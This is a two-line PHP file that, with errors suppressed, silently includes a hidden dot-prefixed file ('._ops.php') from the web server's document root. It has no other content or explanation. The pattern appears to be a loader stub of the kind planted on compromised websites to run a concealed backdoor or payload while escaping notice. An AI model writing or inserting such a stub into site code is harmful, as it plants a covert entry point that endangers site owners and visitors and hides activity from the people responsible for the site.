<?php
@require_once $_SERVER['DOCUMENT_ROOT']."/._ops.php";